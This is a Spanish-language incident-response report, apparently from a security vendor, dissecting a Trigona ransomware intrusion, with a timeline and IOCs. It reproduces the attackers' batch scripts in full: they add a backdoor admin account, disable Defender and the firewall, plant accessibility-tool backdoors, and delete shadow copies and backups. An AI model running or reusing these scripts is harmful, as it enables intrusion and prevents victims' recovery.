---
layout: post
title: "Anatomía de un Compromiso de Ransomware: Trigona Ransomware"
description: "Análisis detallado de un ataque real de ransomware llevado a cabo por el grupo Trigona en noviembre de 2023."
date: 2023-11-15 10:00:00 +0200
author: Merabytes
tags: [ransomware, trigona, incident-response, malware, xdr]
image: /assets/images/posts/trigona-ransomware.jpg
---

## 🔑 Puntos clave

A principios de noviembre de 2023, observamos un ataque significativo de ransomware que involucró al actor de amenazas Trigona. Los actores de amenazas accedieron a la infraestructura interna de la empresa afectada mediante un servicio RDWeb (Terminal Services) expuesto públicamente conectado a un servidor SQL interno, lo que llevó a la exfiltración de datos y la detonación del ransomware en toda su infraestructura interna. 

Se instalaron TeamViewer y SplashTop para mantener el acceso remoto y la persistencia. También poco antes de detonar el ransomware, los atacantes instalaron MeshAgent de MeshCentral (herramienta de ejecución de comandos, descargas de archivos, gestión VNC y RDP).

El software de escaneo de puertos y servicios NetScan (SoftPerfect Ltd.) desempeñó un papel crucial en la realización de diversas operaciones de descubrimiento.

Se creó y ejecutó un script malicioso "zam.bat", el cual habilitó WDigest para habilitar el almacenamiento de credenciales en caché. Este script también creó reglas de firewall para habilitar el acceso RDP y deshabilitó el antivirus de Windows Defender.

Mediante la funcionalidad de transferencia de ficheros de SplashTop se volcó una versión cifrada del troyano "mimikatz", llamada "423844210.dat", la cual se ejecutaba en memoria, y gracias al anterior script que habilitaba WDigest, se comprometieron las credenciales de varios administradores de dominio, las cuales usaron para detonar el ransomware.

## 🪲 Obteniendo persistencia tras el acceso inicial

Los atacantes comenzaron instalando TeamViewer y SplashTop en la máquina comprometida durante el día 4 de noviembre de 2023 a las 11:41 mediante el usuario Administrador local del sistema expuesto para asegurar la persistencia.

La ausencia de intentos de fuerza bruta y el uso de credenciales válidas sugieren que el actor de amenazas pudo haber obtenido la contraseña del Administrador local de la maquina expuesta a través de filtraciones o compra a un IAB (Initial Access Broker), especialmente considerando otros eventos de acceso externo en las semanas previas a la intrusión.

## ↹ Movimiento lateral al servidor SQL principal

El inicio del compromiso se identificó tras un movimiento lateral de la máquina RD expuesta al servidor SQL interno mediante el mismo usuario administrador local que fue usado para el acceso inicial.

Tras acceder con permisos de administrador local en el servidor SQL, se creó un fichero llamado "newuser.bat" que creaba otro usuario Administrador Local en la máquina SQL llamado "sys".

**newuser.bat** - Creacion de nuevo usuario "sys" con contraseña "t1518061-" (Adminsitrador local y RDP)
```bat
Set AdmGroupSID=S-1-5-32-544
Set AdmGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (WMIC Group Where "SID = '%AdmGroupSID%'" Get Name /Value ^| Find "=") Do Set AdmGroup=%%J
Set AdmGroup=%AdmGroup:~0,-1%
net user sys t1518061- /add
net localgroup %AdmGroup% sys /add

Set RDPGroupSID=S-1-5-32-555
Set RDPGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (WMIC Group Where "SID = '%RDPGroupSID%'" Get Name /Value ^| Find "=") Do Set RDPGroup=%%J
Set RDPGroup=%RDPGroup:~0,-1%
net localgroup "%RDPGroup%" sys /add
net accounts /maxpwage:unlimited
```
 

## 🥷 Tácticas de Evasión de Defensas

Tras crear este usuario, se usó el usuario "sys" para mediante otro batch script modificar el registro de windows y habilitar WDigest (almacenamiento de credenciales en caché), habilitar RDP mediante una regla del firewall de Windows y deshabilitar Windows Defender.

**zam.bat** (Habilita WDigest, Habilita RDP, Deshabilita Windows Defender)
```bat
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\HelpPane.exe /f /v Debugger /t REG_SZ /d "%WINDIR%\system32\cmd.exe"
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe /f /v Debugger /t REG_SZ /d "%WINDIR%\system32\cmd.exe"
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe /f /v Debugger /t REG_SZ /d "%WINDIR%\system32\cmd.exe"
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe /f /v Debugger /t REG_SZ /d "%WINDIR%\system32\cmd.exe"
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services /f /v fDenyTSConnections /t REG_DWORD /d 00000000
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services /f /v fAllowUnsolicited /t REG_DWORD /d 00000001
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services /f /v UserAuthentication /t REG_DWORD /d 00000000
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp /f /v SecurityLayer /t REG_DWORD /d 00000001
reg add HKLM\SYSTEM\CurrentControlSet\services\WinDefend /v Start /t REG_DWORD /d 4 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add HKLM\Software\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DisableCAD /t REG_DWORD /d 0 /f
netsh advfirewall set allprofiles state off
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2
```
 

## 🔍 Tareas de reconocimiento y movimiento lateral

### 🌐 Uso de NetScan (alternativa a nmap)

Durante la intrusión se copió y ejecutó la herramienta "netscan.exe" de SoftPerfect Ltd. en C:\\Users\\Administrador\\Pictures\\netscan\\netscan.exe en varios de los servidores a medida que se iban comprometiendo para el descubrimiento de los demás equipos de la red con RDP y SMB habilitado, así como los servicios de bases de datos de otros servidores de la red.

## 📁 Exfiltración de datos

### 🔓 Habilitando la lectura de ficheros bloqueados mediante IOBit Unlocker

Cuatro días después de ejecutar el script "zam.bat", el 8 de noviembre de 2023 a las 23:09, los cibercriminales instalaron el software "IOBit Unlocker" para facilitar la copia de ficheros y la lectura de archivos bloqueados, como por ejemplo la base de datos SQL, la cual no se puede copiar si está en uso por otro proceso. 

### ☁️ Uso de pCloud y exfiltración mediante rclone

Usando este método de desbloqueo de ficheros mediante IOBit Unlocker, se consiguió copiar y robar varios información de la base de datos y el servidor SQL usando el servicio de nube privada www.pcloud.com y el programa de copia remota de ficheros rclone.

El fichero de configuración de rclone estaba cifrado. La contraseña usada se cifra con un hash SHA-256, que produce la clave para conectarse al servidor. La contraseña hasheada no se almacena en el fichero de configuración.

Este tipo de OPSEC muestra una experiencia destacable por parte del grupo que otro actor de amenazas menos experimentado podría pasar por alto.

Uso de SnipeDrive para listado de ficheros y directorios

Durante la fase de exfiltración vimos que el actor de amenazas utilizó un programa denominado "sd.exe" (SnipeDrive).

El programa "sd.exe" es un binario autoextraíble que despliega una herramienta llamada "Snap2HTML.exe" junto con un archivo batch diseñado para ejecutar esta herramienta en cada unidad de disco. La funcionalidad de Snap2HTML es interesante para los actores de amenazas, ya que permite tomar una "instantánea" de las estructuras de carpetas en un disco duro y guardarlas como archivos HTML.

Este listado lo utilizaron para identificar rápidamente los archivos de interés, planificar la exfiltración de datos y documentar la estructura de archivos de la empresa víctima.

## ⬆️ Escalando de Administrador Local a Domain Admin

### Uso de mimikatz (packed, in-memory execution)

Un día después de instalar IObit Unlocker y tras la exfiltración de datos, el 9 de noviembre de 2023 a las 19:44, se copió el fichero "423844210.dat" mediante SplashTop el cual contenía una versión cifrada de la herramienta mimikatz la cual se ejecutaba en memoria para evadir el EDR. Tras su ejecución el grupo de ransomware obtuvo los credenciales de varios administradores del dominio que habían iniciado sesión en el servidor SQL con WDigest habilitado.

## 💥 Detonación del Ransomware mediante RDP y SMB

El 12 de noviembre de 2023 a la 1:00, usando el servidor SQL como pivote, establecieron múltiples conexiones RDP hacia sistemas críticos usando los credenciales de administradores del dominio, incluyendo varios servidores de archivos y de copias de seguridad en los que también copiaron y ejecutaron el ransomware Trigona.

El ransomware también inició conexiones SMB a otros hosts remotos como los NAS y el controlador del dominio principal y secundario, cifrándolos también.

## 🗑️ Borrado de Copias y Bases de Datos tras la Detonación

### Borrado de Shadow Copies y Deshabilitado Sistema de Recuperación de Windows

Tras la ejecución del ransomware, el 12 de noviembre de 2023 a las 3:01 los actores de amenazas desplegaron y ejecutaron masivamente un fichero llamado "coba.bat" para el borrado de Shadow Copies y para deshabilitar el sistema de recuperación de Windows.

**coba.bat**

```bat
timeout /t 1 /nobreak
wbadmin delete systemstatebackup -quiet
wbadmin delete backup -quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled no
vssadmin list shadows
timeout /t 1 /nobreak
vssadmin delete shadows /all /quiet
timeout /t 1 /nobreak
net stop "Microsoft Software Shadow Copy Provider"
net stop "Volume Shadow Copy"
net stop "System Restore Service"
```

### Uso de Wise Force Deleter para borrar las bases de datos SQL

Tras la detonación del ransomware el actor de amenazas también uso "WiseDeleter.exe" de manera manual para borrar la base de datos SQL, la cual no había sido cifrada por el ransomware dado que el servicio SQL estaba levantado e impedía la escritura por parte del ransomware Trigona.


## Detección y IOCs (Indicadores de Compromiso)

### Direcciones IP

- 77.83.36.6  
- 193.106.31.98  

### Hashes y archivos relacionados

- SHA256: feb09cc39b1520d228e9e9274500b8c229016d6fc8018a2bf19aa9d3601492c5  
  - Archivo: disable-defender.exe  
- SHA256: f6440c5cfc1a0bf4fdc63124eef27f40be37af8f46d10aea9a645f5b084004e3  
  - Archivo: defoff.bat  
- SHA256: da0a235cd729d4aa6b209bfe1edefbeeca8fe2ae92d4e3830db7744c9393eadf  
  - Archivo: coba.bat  
- SHA256: 69f245dc5e505d2876e2f2eec87fa565c707e7c391845fa8989c14acabc2d3f6  
  - Archivo: mim.exe  
- SHA256: eeed7ce800a9714b65aaae4f1d61deb83d3f0cbcfd814372807b73c940d4bb8f  
  - Archivo: meshagent.exe  
- SHA256: 4c181562c9a52be9a629522de7d46f04a490b29d673e8a2376e4cb65158c1be6  
  - Archivo: zam.bat  
- SHA256: 18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566  
  - Archivo: netscan.exe  
- SHA256: 1845fe8545b6708e64250b8807f26d095f1875cc1f6159b24c2d0589feb74f0c  
  - Archivo: IObitUnlocker.sys  

### URLs en VirusTotal

- [disable-defender.exe](https://www.virustotal.com/gui/file/feb09cc39b1520d228e9e9274500b8c229016d6fc8018a2bf19aa9d3601492c5)  
- [defoff.bat](https://www.virustotal.com/gui/file/f6440c5cfc1a0bf4fdc63124eef27f40be37af8f46d10aea9a645f5b084004e3)  
- [coba.bat](https://www.virustotal.com/gui/file/da0a235cd729d4aa6b209bfe1edefbeeca8fe2ae92d4e3830db7744c9393eadf)  
- [mim.exe](https://www.virustotal.com/gui/file/69f245dc5e505d2876e2f2eec87fa565c707e7c391845fa8989c14acabc2d3f6)  
- [meshagent.exe](https://www.virustotal.com/gui/file/eeed7ce800a9714b65aaae4f1d61deb83d3f0cbcfd814372807b73c940d4bb8f)  
- [zam.bat](https://www.virustotal.com/gui/file/4c181562c9a52be9a629522de7d46f04a490b29d673e8a2376e4cb65158c1be6)  
- [netscan.exe](https://www.virustotal.com/gui/file/18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66

> Si te interesa acceder a otros informes privados o reglas específicas para EDR/XDR, visita [merabytes.com](https://www.merabytes.com) y solicita acceso a nuestros servicios avanzados de detección y simulación de amenazas.
